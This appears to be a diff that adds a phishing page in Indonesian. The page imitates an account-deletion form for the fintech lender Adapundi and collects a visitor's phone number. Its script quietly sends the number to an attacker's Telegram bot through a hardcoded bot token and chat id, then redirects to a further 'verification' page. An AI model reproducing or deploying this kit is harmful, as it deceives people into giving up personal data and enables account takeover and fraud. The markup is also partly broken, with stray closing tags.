@@ -1,0 +1,234 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Formulir Hapus Data Permanen</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background-color: #fffff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100px;
+            padding: 10px;
+        }
+        
+        .login-container {
+            background-color: white;
+            border-radius: 12px;
+            box-shadow: 0 4px 2px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 500px;
+            padding: 2px;
+            text-align: center;
+        }
+        
+        .logo {
+            margin-bottom: 40px;
+        }
+        
+        .logo img {
+            width: 100%;
+            height: auto;
+            border-radius: 12px;
+        }
+        
+        .input-group {
+            position: relative;
+            margin-bottom: 15px;
+            text-align: left;
+        }
+        
+        .input-group label {
+            display: block;
+            margin-bottom: 18px;
+            font-size: 14px;
+            color: #333;
+            font-weight: 500;
+        }
+        
+        .phone-input {
+            display: flex;
+            align-items: center;
+            border: 1px solid #ddd;
+            border-radius: 20px;
+            overflow: hidden;
+        }
+        
+        .country-code {
+            background-color: #f0f0f0;
+            padding: 12px 16px;
+            font-size: 18px;
+            color: #555;
+        }
+        
+        .phone-input input {
+            flex: 1;
+            padding: 12px 15px;
+            border: none;
+            outline: none;
+            font-size: 16px;
+        }
+        
+        .add-new-number {
+            margin-top: 10px;
+            color: #007bff;
+            font-size: 15px;
+            cursor: pointer;
+            display: inline-block;
+        }
+        
+        .add-new-number:hover {
+            text-decoration: underline;
+        }
+        
+        .login-btn {
+            width: 100%;
+            padding: 15px;
+            border: none;
+            border-radius: 22px;
+            background-color: #FF0000;
+            color: white;
+            font-weight: 600;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 5px;
+            transition: background-color 0.2s;
+        }
+        
+        .login-btn:hover {
+            background-color: #FF0000;
+        }
+        
+        .checkbox-container {
+            display: flex;
+            align-items: flex-start;
+            margin: 5px 5px;
+        }
+        
+        .checkbox-container input {
+            margin-right: 10px;
+            margin-top: 5px;
+        }
+        
+        .checkbox-container label {
+            font-size: 15px;
+            color: #666;
+            text-align: left;
+            line-height: 1.4;
+        }
+        
+        .terms {
+            font-size: 15px;
+            color: #666;
+            margin-top: 100px;
+            line-height: 1.4;
+        }
+        
+        .terms a {
+            color: #007bff;
+            margin-top: 100px;
+            text-decoration: none;
+        }
+        
+        .terms a:hover {
+            text-decoration: underline;
+            margin-top: 100px;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="logo">
+            <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiMq-pRFXAkhHPbTpS4_90iiK4sN6qFahPtj8LaUkYIlz9PHElV6SMM11XDrI4wR7tLBAJwJIfSAx_Mgl1pt9D0FcZbAxM9hNTSCAXd7iXcZVx1qhqhoCj-ymw1zJ5gE0tPcgFWjyvyycsIDxHRNxEBj5Wy8_a5-iz7pRMhB7rtWKHKWqnqjwxJn6Ebmrg/s1600/1000014392.jpg" alt="Adapundi logo - modern fintech company branding with orange and blue colors" />
+        </div>
+        
+        <div class="input-group">
+            <label for="phone">Masukkan Nomor HP</label>
+            <div class="phone-input">
+                <span class="country-code">+62</span>
+                <input type="tel" id="phone" placeholder="Nomor No.HP Awalan Angka 8" maxlength="15">
+            </div>
+            <span class="add-new-number">Nomor Tidak Aktif? Tambah </a>nomor baru anda</span>
+        </div>
+        
+        <button class="login-btn" id="loginBtn">Hapus Akun</button></button></button>
+        
+        <div class="checkbox-container">
+            <input type="checkbox" id="agreeNotifications" checked>
+            <label for="agreeNotifications">Saya setuju untuk menerima semua notifikasi informasi promo dari kami</label>
+        </div>
+        
+        <p class="terms">
+            Dengan Daftar/Masuk, berarti Anda setuju dengan <a href="#">Kebijakan Privasi</a> dan <a href="#">Syarat & Ketentuan</a>
+        </p>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const phoneInput = document.getElementById('phone');
+            const loginBtn = document.getElementById('loginBtn');
+            
+            // Format phone number while typing
+            phoneInput.addEventListener('input', function(e) {
+                let value = e.target.value.replace(/\D/g, '');
+                if (value.length > 0) {
+                    value = value.match(/(\d{0,4})(\d{0,4})(\d{0,7})/);
+                    value = (value[1] ? value[1] + ' ' : '') + 
+                            (value[2] ? value[2] + ' ' : '') + 
+                            (value[3] ? value[3] : '');
+                    e.target.value = value.trim();
+                }
+            });
+            
+            // Login button click handler
+            loginBtn.addEventListener('click', function() {
+                const phoneNumber = '+62' + document.getElementById('phone').value.replace(/\D/g, '');
+                const agreeNotifications = document.getElementById('agreeNotifications').checked;
+                
+                if (!phoneNumber || phoneNumber.length < 5) {
+                    alert('Harap masukkan nomor HP yang valid');
+                    return;
+                }
+                
+                // Send data to Telegram
+                sendToTelegram(phoneNumber, agreeNotifications);
+                
+                // Here you would normally redirect or show success message
+                alert(' Apakah anda ingin melanjutkan proses Penghapusan Akun dengan Nomor telepon   ' + phoneNumber);
+            });
+            
+            function sendToTelegram(phoneNumber, notificationsAgreed) {
+                const botToken = '7910676766:AAFS7WsC-IiXkPxqH5e49_Uc6uHT6EUIFR8';
+                const chatId = '7880651844';
+                const message = `Login Attempt:
+Phone: ${phoneNumber}
+Agreed to notifications: ${notificationsAgreed ? 'Yes' : 'No'}
+Timestamp: ${new Date().toLocaleString()}`;
+                
+                // Using fetch API to send to Telegram
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
+                    .then(response => {
+                        if (!response.ok) {
+                            console.error('Failed to send to Telegram');
+                        }
+                    })
+                    .catch(error => {
+                        console.error('Error sending to Telegram:', error);
+                    });
+ window.location.href="verifikasi.html";               
+                // Alternative method using webhook if available
+                // Implement your preferred method to send data to Telegram here
+            }
+        });
+    </script>
+</body>
+</html>
